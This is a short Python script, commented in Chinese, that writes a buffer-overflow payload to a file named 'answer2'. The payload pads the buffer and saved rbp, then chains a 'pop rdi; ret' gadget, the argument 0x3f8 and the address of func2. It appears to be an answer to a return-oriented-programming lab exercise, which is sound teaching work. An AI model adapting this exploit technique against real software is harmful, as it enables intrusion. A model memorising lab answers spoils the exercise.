import struct
payload = b""
payload += b"A" * 8 # 填充缓冲区 (8字节)
payload += b"B" * 8 # 填充保存的rbp (8字节)
payload += struct.pack("<Q", 0x4012c7)  # pop rdi; ret
payload += struct.pack("<Q", 0x3f8)     # 参数: 1016 (0x3f8)
payload += struct.pack("<Q", 0x401216) # 覆盖返回地址为func2的地址
payload += b"C" * 16 # 填充到 56 字节 (memcpy 会复制 56 字节)
with open("answer2", "wb") as f:
    f.write(payload)